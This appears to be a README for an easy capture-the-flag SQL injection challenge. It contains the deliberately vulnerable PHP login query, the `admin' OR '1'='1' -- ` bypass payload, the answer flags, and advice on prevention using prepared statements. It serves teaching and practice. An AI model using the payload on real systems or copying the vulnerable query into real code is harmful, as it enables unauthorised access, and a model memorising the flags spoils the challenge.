# SQL Injection - Login Bypass

## Challenge Description

A vulnerable login form that can be bypassed using SQL injection techniques. Your goal is to find both the user flag and the root flag.

## Difficulty
**Easy** - 100 points total
- User Flag: 50 points
- Root Flag: 50 points

## Learning Objectives
- Understanding SQL injection vulnerabilities
- Authentication bypass techniques
- Basic database enumeration
- Environment variable exploration

## Flags

### User Flag
- **Location**: Database `secrets` table
- **Hash**: `a1b2c3d4e5f6789012345678901234ab`
- **Format**: `XACK{a1b2c3d4e5f6789012345678901234ab}`

### Root Flag
- **Location**: Environment variable `FLAG_ROOT`
- **Hash**: `e99a18c428cb38d5f260853678922e03`
- **Format**: `XACK{e99a18c428cb38d5f260853678922e03}`

## Deployment

### Local Testing
```bash
cd machines/web/sql-injection-basic
docker network create web-challenges
docker-compose up -d
```

Access at: http://localhost:8080

### Production (VPS)
```bash
# Set user ID for isolated instance
export USER_ID=123
export PORT=8080

docker-compose up -d
```

## Solution Walkthrough

### Step 1: Identify the Vulnerability
The login form uses unsanitized user input directly in SQL queries:
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

### Step 2: Bypass Authentication
Use SQL injection to bypass the login:

**Payload**: `admin' OR '1'='1' -- `

- Username: `admin' OR '1'='1' -- `
- Password: (anything)

This transforms the query to:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = ''
```

### Step 3: Capture User Flag
After successful login, the admin panel displays the user flag from the database.

**User Flag**: `XACK{a1b2c3d4e5f6789012345678901234ab}`

### Step 4: Find Root Flag
The admin panel hints that the root flag is in environment variables or database configuration.

Options to find it:
1. Check the admin panel - it displays the root flag for admin users
2. Enumerate database using UNION injection
3. Access environment variables through code execution

**Root Flag**: `XACK{e99a18c428cb38d5f260853678922e03}`

## Prevention

To prevent SQL injection:
1. Use prepared statements with parameterized queries
2. Implement input validation and sanitization
3. Use ORM frameworks
4. Apply principle of least privilege for database users
5. Implement Web Application Firewall (WAF)

### Secure Code Example
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

## Tags
`sql-injection`, `authentication-bypass`, `web`, `owasp-top-10`
